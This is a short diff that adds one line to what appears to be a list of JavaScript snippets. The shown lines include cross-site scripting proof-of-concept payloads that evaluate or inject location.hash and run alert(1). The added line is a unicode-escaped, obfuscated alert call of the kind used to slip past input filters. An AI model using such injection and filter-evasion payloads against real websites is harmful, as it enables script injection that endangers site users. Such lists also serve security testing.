@@ -281,3 +281,4 @@ eval(location.hash.slice(1)>#alert(1)
 innerHTML=location.hash>#<script>alert(1)</script>
 setInterval('location.hash="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"[i++%10]',i=99)
 (X,)=>1
+For([]o\u{66}!\u{61}\u{6c}\u{65}\u{72}\u{74}`1`)\u{66}
